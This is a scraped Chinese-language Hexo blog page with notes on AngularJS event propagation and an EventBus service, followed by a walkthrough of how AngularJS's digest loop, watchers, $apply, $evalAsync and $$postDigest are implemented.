<h1 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h1><p>angular事件流是一个通知广播的过程<br>现有A、B两个视图，每个视图又包含各自两个子视图，如果A视图的A1子视图想通知B视图的子视图B1一个业务事件(或传递某个消息)<br>那A1就发出业务通知，这个通知会沿着父作用域一路往上到达双方共同的祖先作用域<br>然后这个通知会以广播的形式从祖先作用域一级一级往下进行广播，直到到达需要的地方<br><img src="/image/angularissue.png" alt="issue1"><br>相关事件：<br>从作用域往上发送事件，使用scope.$emit。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$scope.$emit(&quot;someEvent&quot;, &#123;&#125;);</div></pre></td></tr></table></figure></p>
<p>从作用域往下发送事件，使用scope.$broadcast<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$scope.$broadcast(&quot;someEvent&quot;, &#123;&#125;);</div></pre></td></tr></table></figure></p>
<p>这两个方法的第二个参数是要随事件带出的数据。<br>这两种方式传播事件，事件的发送方自己也会收到一份。<br>无论是$emit还是$broadcast发送的事件，都可以被接收，接收这两种事件的方式是一样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    // 这里从e上可以取到发送过来的数据</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>如果想要阻止$emit事件的继续传播，可以调用事件对象的stopPropagation()方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    e.stopPropagation();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>想要阻止$broadcast事件的传播,首先，调用事件对象的preventDefault()方法，<br>然后，在收取这个事件对象的时候，判断它的defaultPrevented属性，如果为true，就忽略此事件。<br>这个过程比较麻烦，其实一般是不需要管的，只要不监听对应的事件就可以了。<br>在实际使用过程中，也应当尽量少使用事件的广播，尤其是从较高的层级进行广播<br>上级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    e.preventDefault();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>下级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    if (e.defaultPrevented) &#123;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h2 id="事件总线"><a href="#事件总线" class="headerlink" title="事件总线"></a>事件总线</h2><p>事件流的通知过程效率低，而且很多下级视图可能根本不要接收消息，进行多余的广播，<br>所以组建订阅发布模式，接收方在这里订阅消息，发布方在这里发布消息，这个地方就是事件总线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">app.factory(&quot;EventBus&quot;, function() &#123;</div><div class="line">    var eventMap = &#123;&#125;;</div><div class="line"></div><div class="line">    var EventBus = &#123;</div><div class="line">        on : function(eventType, handler) &#123; //订阅事件</div><div class="line">            //multiple event listener</div><div class="line">            if (!eventMap[eventType]) &#123;</div><div class="line">                eventMap[eventType] = [];</div><div class="line">            &#125;</div><div class="line">            eventMap[eventType].push(handler);</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">        off : function(eventType, handler) &#123;</div><div class="line">            for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</div><div class="line">                if (eventMap[eventType][i] === handler) &#123;</div><div class="line">                    eventMap[eventType].splice(i, 1);</div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">        fire : function(event) &#123; //发布事件</div><div class="line">            var eventType = event.type;</div><div class="line">            if (eventMap &amp;&amp; eventMap[eventType]) &#123;</div><div class="line">                for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</div><div class="line">                    eventMap[eventType][i](event);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    return EventBus;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/angular-digest.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/angular-digest.html" itemprop="url">
                  AngularJS Digest
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-28T16:33:15+08:00">
                2017-10-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>通常angularjs 环境中变量都绑定在Scope对象上，检测这些变量变化的机制也绑定在该对象上</p>
<p>为了检测数据发生变化，所以为每一个变量创建监听器<br>监听器包含两部分内容<br>一个监控函数,负责前后数据对比<br>一个监听函数，规定对数据变化做出什么响应</p>
<p>但是监听器需要有机制进行触发才能发挥作用<br>即调用监控函数，看数据是否发生变化，然后根据结果再调用监听函数，对变化做出响应</p>
<p>因此，在Scope对象上挂载函数和属性实现以上机制</p>
<p>Scope.$$watchers = []    用于保存注册过的所有监听器</p>
<p>Scope.prototype.$watch = function(watchFn, listenerFn) {} 用于将监控函数和监听函数组合成监听器，然后保存到$$watchers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn) &#123;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,//监控函数</div><div class="line">    listenerFn: listenerFn || function() &#123; &#125; //监听函数</div><div class="line">  &#125;;</div><div class="line">  this.$$watchers.push(watcher);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Scope.prototype.$$digestOnce = function() {}<br>具体的脏检查过程，初始化变更标记，遍历一遍$$watchers，<br>如果某个数据发生变化就执行对应监听函数，<br>并将变更标记设置true返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$digestOnce = function() &#123;</div><div class="line">  var self  = this;</div><div class="line">  var dirty;</div><div class="line">  _.forEach(this.$$watchers, function(watch) &#123;</div><div class="line">    var newValue = watch.watchFn(self);</div><div class="line">    var oldValue = watch.last;</div><div class="line">    if (newValue !== oldValue) &#123;</div><div class="line">      watch.listenerFn(newValue, oldValue, self);</div><div class="line">      dirty = true;</div><div class="line">    &#125;</div><div class="line">    watch.last = newValue;</div><div class="line">  &#125;);</div><div class="line">  return dirty;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Scope.prototype.$digest = function() {} 循环执行检测，保证监控器内部对属性进行的变更也能被检测到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  do &#123;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>如果仅执行一次digest，检测不到B监听器监听函数修改的A监听器监听的属性新值，<br>因此进行持续遍历所有监听器，直到监控的值停止变更<br>$digest为$$digestOnce包裹一个do-while“外层循环”，<br>如果第一次运行完，有监控值发生变更了，标记为dirty，所有监听器再运行第二次。这会一直运行，直到所有监控的值都不再变化，整个局面稳定下来了。<br>如果两个监听器互相监控了对方产生的变更，状态始终不会稳定，因此添加迭代数量ttl，限制迭代次数，保证循环检测的可控性，达到ttl就抛异常</p>
<h1 id="对于新旧值的判断-areEqual"><a href="#对于新旧值的判断-areEqual" class="headerlink" title="对于新旧值的判断 - $$areEqual"></a>对于新旧值的判断 - $$areEqual</h1><p>$$digestOnce中使用！==判断新旧值，可以判断值的引用但无法判断值的变更<br>因此在监控器里增加字段valueEq，用来定制判断方法，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,</div><div class="line">    listenerFn: listenerFn,</div><div class="line">    valueEq: !!valueEq</div><div class="line">  &#125;;</div><div class="line">  this.$$watchers.push(watcher);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>定制判断方法,抽离成函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$areEqual = function(newValue, oldValue, valueEq) &#123;</div><div class="line">  if (valueEq) &#123;</div><div class="line">    return _.isEqual(newValue, oldValue);</div><div class="line">  &#125; else &#123;</div><div class="line">    return newValue === oldValue ||</div><div class="line">      (typeof newValue === &apos;number&apos; &amp;&amp; typeof oldValue === &apos;number&apos; &amp;&amp;</div><div class="line">       isNaN(newValue) &amp;&amp; isNaN(oldValue));//对NaN特殊情况进行处理</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>判断方法发生改变，进而存储方法也要根据判断方式进行改变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$digestOnce = function() &#123;</div><div class="line">  var self  = this;</div><div class="line">  var dirty;</div><div class="line">  _.forEach(this.$$watchers, function(watch) &#123;</div><div class="line">    var newValue = watch.watchFn(self);</div><div class="line">    var oldValue = watch.last;</div><div class="line">    if (!self.$$areEqual(newValue, oldValue, watch.valueEq)) &#123;</div><div class="line">      watch.listenerFn(newValue, oldValue, self);</div><div class="line">      dirty = true;</div><div class="line">    &#125;</div><div class="line">    watch.last = (watch.valueEq ? _.cloneDeep(newValue) : newValue); //定制存储方式</div><div class="line">  &#125;);</div><div class="line">  return dirty;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Angular默认不使用基于值的脏检测的原因，用户需要显式设置这个标记去打开它。</p>
<h1 id="集成外部代码与digest循环-apply"><a href="#集成外部代码与digest循环-apply" class="headerlink" title="集成外部代码与digest循环-$apply"></a>集成外部代码与digest循环-$apply</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//$eval使用一个函数作参数，所做的事情是立即执行这个传入的函数，并且把作用域自身当作参数传递给它，</div><div class="line">//返回的是这个函数的返回值。$eval也可以有第二个参数，它所做的仅仅是把这个参数传递给这个函数。</div><div class="line">Scope.prototype.$eval = function(expr, locals) &#123;</div><div class="line">  return expr(this, locals);</div><div class="line">&#125;;</div><div class="line">//$apply可以执行一些与Angular无关的代码(expr)，这些代码也还是可以改变作用域上的东西，</div><div class="line">//$apply可以保证作用域上的监听器可以检测这些变更。</div><div class="line">Scope.prototype.$apply = function(expr) &#123;</div><div class="line">  try &#123;</div><div class="line">    return this.$eval(expr);</div><div class="line">  &#125; finally &#123;</div><div class="line">    this.$digest();</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="延迟执行-evalAsync"><a href="#延迟执行-evalAsync" class="headerlink" title="延迟执行 - $evalAsync"></a>延迟执行 - $evalAsync</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">Scope.$$asyncQueue = [];//存储$evalAsync列入计划的任务</div><div class="line">Scope.$$phase = null;//作用域上一个简单的字符串属性，存储了现在正在做的信息</div><div class="line">//设置$$phase</div><div class="line">Scope.prototype.$beginPhase = function(phase) &#123;</div><div class="line">  if (this.$$phase) &#123;</div><div class="line">    throw this.$$phase + &apos; already in progress.&apos;;</div><div class="line">  &#125;</div><div class="line">  this.$$phase = phase;</div><div class="line">&#125;;</div><div class="line">//删除$$phase</div><div class="line">Scope.prototype.$clearPhase = function() &#123;</div><div class="line">  this.$$phase = null;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  this.$beginPhase(&quot;$digest&quot;); //设置状态</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123;</div><div class="line">      var asyncTask = this.$$asyncQueue.shift();</div><div class="line">      this.$eval(asyncTask.expression);</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      this.$clearPhase();</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">  this.$clearPhase();//移除状态</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$apply = function(expr) &#123;</div><div class="line">  try &#123;</div><div class="line">    this.$beginPhase(&quot;$apply&quot;);//设置状态</div><div class="line">    return this.$eval(expr);</div><div class="line">  &#125; finally &#123;</div><div class="line">    this.$clearPhase();//移除状态</div><div class="line">    this.$digest();</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$evalAsync = function(expr) &#123; 添加任务</div><div class="line">  Scope.prototype.$evalAsync = function(expr) &#123;</div><div class="line">  var self = this;</div><div class="line">  if (!self.$$phase &amp;&amp; !self.$$asyncQueue.length) &#123;</div><div class="line">    console.log(1)</div><div class="line">    setTimeout(function() &#123;利用异步，连续添加任务后一定会立即digest一次</div><div class="line">      console.log(3)</div><div class="line">      if (self.$$asyncQueue.length) &#123;</div><div class="line">        self.$digest();</div><div class="line">      &#125;</div><div class="line">    &#125;, 0);</div><div class="line">  &#125;</div><div class="line">  console.log(2)</div><div class="line">  self.$$asyncQueue.push(&#123;scope: self, expression: expr&#125;);</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">&#125;;</div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123; </div><div class="line">      var asyncTask = this.$$asyncQueue.shift();</div><div class="line">      this.$eval(asyncTask.expression);</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在监听函数中执行$evalAsync，digest第一次时延迟任务不会被执行，当dirty时，才会被执行<br>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var scope = new Scope();</div><div class="line">scope.asyncEvaled = false;</div><div class="line"></div><div class="line">scope.$evalAsync(function(scope) &#123;</div><div class="line">  scope.asyncEvaled = false;</div><div class="line">&#125;);</div><div class="line">console.log(4)</div><div class="line">scope.$evalAsync(function(scope) &#123;</div><div class="line">  scope.asyncEvaled = true;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">console.log(&quot;Evaled after digest: &quot;+scope.asyncEvaled);//true</div></pre></td></tr></table></figure></p>
<h1 id="在digest之后执行代码-postDigest"><a href="#在digest之后执行代码-postDigest" class="headerlink" title="在digest之后执行代码 - $$postDigest"></a>在digest之后执行代码 - $$postDigest</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">this.$$postDigestQueue = [];//$$postDigest函数列入计划</div><div class="line">Scope.prototype.$$postDigest = function(fn) &#123;</div><div class="line">  this.$$postDigestQueue.push(fn);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  this.$beginPhase(&quot;$digest&quot;);</div><div class="line">  do &#123;</div><div class="line">    while (this.$$asyncQueue.length) &#123;</div><div class="line">      try &#123;//执行函数时，使用try-catch进行异常处理</div><div class="line">        var asyncTask = this.$$asyncQueue.shift();</div><div class="line">        this.$eval(asyncTask.expression);</div><div class="line">      &#125; catch (e) &#123;</div><div class="line">        (console.error || console.log)(e);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      this.$clearPhase();</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">  this.$clearPhase();</div><div class="line"> </div><div class="line">  while (this.$$postDigestQueue.length) &#123; //在digest最后执行</div><div class="line">    try &#123;</div><div class="line">      this.$$postDigestQueue.shift()();</div><div class="line">    &#125; catch (e) &#123;</div><div class="line">      (console.error || console.log)(e);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="销毁一个监听器"><a href="#销毁一个监听器" class="headerlink" title="销毁一个监听器"></a>销毁一个监听器</h1><p>在注册监听器时，返回一个销毁该监听器的函数，如果将来要销毁该监听器，就将返回的函数保存<br>在销毁时，直接执行该函数即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</div><div class="line">  var self = this;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,</div><div class="line">    listenerFn: listenerFn,</div><div class="line">    valueEq: !!valueEq</div><div class="line">  &#125;;</div><div class="line">  self.$$watchers.push(watcher);</div><div class="line">  return function() &#123;</div><div class="line">    var index = self.$$watchers.indexOf(watcher);</div><div class="line">    if (index &gt;= 0) &#123;</div><div class="line">      self.$$watchers.splice(index, 1);</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line">var scope = new Scope();</div><div class="line">var removeWatch = scope.$watch(</div><div class="line">  function(scope) &#123;</div><div class="line">    return scope.aValue;</div><div class="line">  &#125;,</div><div class="line">  function(newValue, oldValue, scope) &#123;</div><div class="line">    scope.counter++;</div><div class="line">  &#125;</div><div class="line">);</div><div class="line">removeWatch();</div></pre></td></tr></table></figure></p>
<p><a href="https://github.com/xufei/Make-Your-Own-AngularJS/blob/master/01.md" target="_blank" rel="external">文档链接</a><br><a href="https://github.com/YooHannah/algorithm/blob/master/js/angulardigest.js" target="_blank" rel="external">完整代码</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/psb.jpg"
               alt="YooHannah" />
          <p class="site-author-name" itemprop="name">YooHannah</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">125</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">1</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">13</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YooHannah</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/treedocument/treedocument.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	




  
  

  

  

  

  


</body>
</html>
